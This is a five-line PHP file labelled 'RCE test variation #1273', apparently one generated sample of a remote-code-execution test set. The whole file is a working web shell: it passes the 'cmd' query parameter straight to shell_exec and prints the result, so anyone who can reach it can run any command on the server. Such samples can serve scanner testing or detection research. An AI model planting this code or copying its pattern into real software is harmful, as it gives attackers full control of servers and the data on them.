<?php
// RCE test variation #1273
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>